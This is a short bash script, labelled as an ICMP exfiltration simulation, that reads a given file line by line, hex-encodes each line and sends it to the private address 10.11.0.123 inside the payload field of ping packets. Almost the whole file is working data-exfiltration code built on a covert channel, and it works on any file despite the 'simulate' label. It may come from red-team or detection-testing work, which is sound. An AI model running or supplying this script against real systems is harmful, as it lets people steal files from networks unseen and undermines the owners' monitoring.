#!/bin/bash
# Simulate exfiltration over ICMP (requires listener using tcpdump or custom pinger)

FILE="$1"
DEST="10.11.0.123"

if [[ ! -f "$FILE" ]]; then
    echo "File not found: $FILE"
    exit 1
fi

while read -r line; do
    ping -c 1 -p "$(echo $line | xxd -p | tr -d '\n')" $DEST > /dev/null
    sleep 1
done < "$FILE"
